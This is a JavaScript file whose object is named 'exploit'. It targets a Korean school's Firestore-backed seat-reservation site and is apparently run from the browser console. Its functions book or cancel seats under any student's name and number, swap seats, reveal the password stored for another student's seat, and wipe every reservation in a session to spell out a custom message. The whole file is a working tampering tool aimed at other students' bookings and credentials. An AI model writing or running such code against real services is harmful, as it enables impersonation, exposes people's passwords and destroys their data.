// (자리 번호): [반, 번호, 이름, 비밀번호]
const exploit = {
    get: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        console.log(ymd+'-'+time);
        db.collection("product1").doc(ymd+'-'+time).get().then((result) => {
            console.log(result.data());
        });
    },

    // Call function after setting save variable
    set: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var save = {
            // 각 자리의 예약자
            A1:["", "", "", ""], A2:["", "", "", ""], A3:["", "", "", ""], A4:["", "", "", ""], A5:["", "", "", ""], A6:["", "", "", ""], 
            B1:["", "", "", ""], B2:["", "", "", ""], B3:["", "", "", ""], B4:["", "", "", ""], B5:["", "", "", ""], B6:["", "", "", ""], 
            C1:["", "", "", ""], C2:["", "", "", ""], C3:["", "", "", ""], C4:["", "", "", ""], C5:["", "", "", ""], C6:["", "", "", ""], 
            D1:["", "", "", ""], D2:["", "", "", ""], D3:["", "", "", ""], D4:["", "", "", ""], D5:["", "", "", ""], D6:["", "", "", ""], 
            E1:["", "", "", ""], E2:["", "", "", ""], E3:["", "", "", ""], E4:["", "", "", ""], E5:["", "", "", ""], E6:["", "", "", ""], 
            F1:["", "", "", ""], F2:["", "", "", ""], F3:["", "", "", ""], F4:["", "", "", ""], F5:["", "", "", ""], F6:["", "", "", ""], 
            // 각 학번의 예약 여부
            _MAP:{
                '1101':0, '1102':0, '1103':0, '1104':0, '1105':0, '1106':0, '1107':0, '1108':0, '1109':0, '1110':0, '1111':0, '1112':0, '1113':0, '1114':0, '1115':0, '1116':0, '1117':0, '1118':0, '1119':0, '1120':0, '1121':0, '1122':0, '1123':0, '1124':0,
                '1201':0, '1202':0, '1203':0, '1204':0, '1205':0, '1206':0, '1207':0, '1208':0, '1209':0, '1210':0, '1211':0, '1212':0, '1213':0, '1214':0, '1215':0, '1216':0, '1217':0, '1218':0, '1219':0, '1220':0, '1221':0, '1222':0, '1223':0, '1224':0,
                '1301':0, '1302':0, '1303':0, '1304':0, '1305':0, '1306':0, '1307':0, '1308':0, '1309':0, '1310':0, '1311':0, '1312':0, '1313':0, '1314':0, '1315':0, '1316':0, '1317':0, '1318':0, '1319':0, '1320':0, '1321':0, '1322':0, '1323':0, '1324':0,
                '1401':0, '1402':0, '1403':0, '1404':0, '1405':0, '1406':0, '1407':0, '1408':0, '1409':0, '1410':0, '1411':0, '1412':0, '1413':0, '1414':0, '1415':0, '1416':0, '1417':0, '1418':0, '1419':0, '1420':0, '1421':0, '1422':0, '1423':0, '1424':0
            }
        };
        db.collection('product1').doc(ymd+'-'+time).set(save);
    
        setTimeout(() => {
            location.reload();
        },500);
    },

    // set update variable before call the function
    update: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var zali = prompt('자리를 입력하세요...');
        var _class = prompt('표시가 되기를 원하는 반을 입력하세요...');
        var num = prompt('표시가 되기를 원하는 번호를 입력하세요...');
        var name = prompt('표시가 되기를 원하는 이름을 입력하세요...');
        if(num.length == 1) {
            num = '0' + num;
        }
        var stunum = _class + num;
        var bool = confirm('자리 : ' + zali + ', 학번 : ' + '1' + stunum + ', 이름 : ' + name + ' 이(가) 맞습니까?');
        if(bool) {
            var save = {
                [zali]: [_class, num, name, 0],
                _MAP: {
                    '1124': 0
                }
            };
            db.collection('product1').doc(ymd+'-'+time).update(save);
        
            setTimeout(() => {
                location.reload();
            },500);
        }
    },
    
    setPassword : function() { 
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var zali = prompt('자리를 입력하세요...');
        var _class = prompt('반을 입력하세요...');
        var num = prompt('번호를 입력하세요...');
        var name = prompt('이름을 입력하세요...');
        var password = prompt('설정할 비밀번호를 입력하세요...');
        if(num.length == 1) {
            num = '0' + num;
        }
        var stunum = _class + num;
        var bool = confirm('자리 : ' + zali + ', 학번 : ' + '1' + _class + num + ', 이름 : ' + name + ', 비밀번호 : ' + password + ' 이(가) 맞습니까?');
        if(bool) {
            var save = {
                [zali]: [_class, num, name, password],
                _MAP: {
                    [stunum]: 1
                }
            };
            db.collection('product1').doc(ymd+'-'+time).update(save);

            setTimeout(() => {
                location.reload();
            }, 500);
        }
    },

    getOut: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var zali = prompt('자리를 입력하세요...');
        var _class = prompt('반을 입력하세요...');
        var num = prompt('번호를 입력하세요...');
        var name = prompt('이름을 입력하세요...');
        if(num.length == 1) {
            num = '0' + num;
        }
        var stunum = _class + num;
        var bool = confirm('자리 : ' + zali + ', 학번 : ' + '1' + _class + num + ', 이름 : ' + name + ' 이(가) 맞습니까?');
        if(bool) {
            var save = {
                [zali]: ["", "", "", ""],
                _MAP: {
                    [stunum]: 0
                }
            };
            db.collection('product1').doc(ymd+'-'+time).update(save);

            setTimeout(() => {
                location.reload();
            }, 500);
        }
    },

    getPassword: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var zali = prompt('자리 번호를 입력하세요...');
        var bool = confirm('자리 : ' + zali + ' 가 맞습니까?')
        if (bool) { 
            db.collection("product1").doc(ymd+'-'+time).get().then((result) => {
                var pw = result.data()[zali][3];
                alert('비밀번호는 ' + pw + ' 입니다.')
            });
        }
    },

    change: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var zali1 = prompt('현재 자리 번호를 입력하세요...');
        var zali2 = prompt('바꿀 자리 번호를 입력하세요...');
        var bool = confirm(zali1 + ' 자리와 ' + zali2 + ' 자리를 바꾸시겠습니까?');
        if (bool) { 
            db.collection("product1").doc(ymd+'-'+time).get().then((result) => {
                var zali1_class = result.data()[zali1][0];
                var zali1_num = result.data()[zali1][1];
                var zali1_name = result.data()[zali1][2];
                var zali1_password = result.data()[zali1][3];
                var zali2_class = result.data()[zali2][0];
                var zali2_num = result.data()[zali2][1];
                var zali2_name = result.data()[zali2][2];
                var zali2_password = result.data()[zali2][3];
                if(zali1_num.length == 1) {
                    var zali1_stunum = '1' + zali1_class + '0' + zali1_num;
                }
                else {
                    var zali1_stunum = '1' + zali1_class + zali1_num;
                }
                if(zali2_num.length == 1) {
                    var zali2_stunum = '1' + zali2_class + '0' + zali2_num;
                }
                else {
                    var zali2_stunum = '1' + zali2_class + zali2_num;
                }

                var save = {
                    [zali1]: [zali2_class, zali2_num, zali2_name, zali2_password],
                    [zali2]: [zali1_class, zali1_num, zali1_name, zali1_password],
                    _MAP: {
                        [zali1_stunum]: 1,
                        [zali2_stunum]: 1
                    }
                };
                db.collection('product1').doc(ymd+'-'+time).update(save);
    
                setTimeout(() => {
                    location.reload();
                }, 500);
            });
        }
    },

    play: function() {
        db = firebase.firestore();
        ymd = window.location.search.substring(6, 14);
        time = window.location.search[20];
        var string = prompt('입력하고 싶은 멘트를 입력하세요...(36자 제한)');
        if(string.split(' ').length != 1) {
            temp = string.split(' ');
            string = "";
            for(var i=0; i<=string.split(' ').length; i++) {
                string += temp[i];
            }
        }
        var string_finish = [];
        var zali_arr = ['A1', 'A2', 'B1', 'B2', 'A3', 'A4', 'B3', 'B4', 'A5', 'A6', 'B5', 'B6', 'C1', 'C2', 'D1', 'D2', 'C3', 'C4', 'D3', 'D4', 'C5', 'C6', 'D5', 'D6', 'E1', 'E2', 'F1', 'F2', 'E3', 'E4', 'F3', 'F4', 'E5', 'E6', 'F5', 'F6'];
        for(i=0; i<36; i++) { 
            if(i < string.length) { 
                string_finish[i] = string[i];
            }
            else {
                string_finish[i] = "";
            }
        };
        var save = {
            A1:["", "", "", ""], A2:["", "", "", ""], A3:["", "", "", ""], A4:["", "", "", ""], A5:["", "", "", ""], A6:["", "", "", ""], 
            B1:["", "", "", ""], B2:["", "", "", ""], B3:["", "", "", ""], B4:["", "", "", ""], B5:["", "", "", ""], B6:["", "", "", ""], 
            C1:["", "", "", ""], C2:["", "", "", ""], C3:["", "", "", ""], C4:["", "", "", ""], C5:["", "", "", ""], C6:["", "", "", ""], 
            D1:["", "", "", ""], D2:["", "", "", ""], D3:["", "", "", ""], D4:["", "", "", ""], D5:["", "", "", ""], D6:["", "", "", ""], 
            E1:["", "", "", ""], E2:["", "", "", ""], E3:["", "", "", ""], E4:["", "", "", ""], E5:["", "", "", ""], E6:["", "", "", ""], 
            F1:["", "", "", ""], F2:["", "", "", ""], F3:["", "", "", ""], F4:["", "", "", ""], F5:["", "", "", ""], F6:["", "", "", ""], 
            _MAP:{
                '1101':0, '1102':0, '1103':0, '1104':0, '1105':0, '1106':0, '1107':0, '1108':0, '1109':0, '1110':0, '1111':0, '1112':0, '1113':0, '1114':0, '1115':0, '1116':0, '1117':0, '1118':0, '1119':0, '1120':0, '1121':0, '1122':0, '1123':0, '1124':0,
                '1201':0, '1202':0, '1203':0, '1204':0, '1205':0, '1206':0, '1207':0, '1208':0, '1209':0, '1210':0, '1211':0, '1212':0, '1213':0, '1214':0, '1215':0, '1216':0, '1217':0, '1218':0, '1219':0, '1220':0, '1221':0, '1222':0, '1223':0, '1224':0,
                '1301':0, '1302':0, '1303':0, '1304':0, '1305':0, '1306':0, '1307':0, '1308':0, '1309':0, '1310':0, '1311':0, '1312':0, '1313':0, '1314':0, '1315':0, '1316':0, '1317':0, '1318':0, '1319':0, '1320':0, '1321':0, '1322':0, '1323':0, '1324':0,
                '1401':0, '1402':0, '1403':0, '1404':0, '1405':0, '1406':0, '1407':0, '1408':0, '1409':0, '1410':0, '1411':0, '1412':0, '1413':0, '1414':0, '1415':0, '1416':0, '1417':0, '1418':0, '1419':0, '1420':0, '1421':0, '1422':0, '1423':0, '1424':0
            }
        };
        for(i=0; i<36; i++) { 
            if(string_finish[i] != "") {
                save[zali_arr[i]] = ["0", "0", string_finish[i], "0"];
            }
        };
        db.collection('product1').doc(ymd+'-'+time).set(save);
    
        setTimeout(() => {
            location.reload();
        },500);
    },
}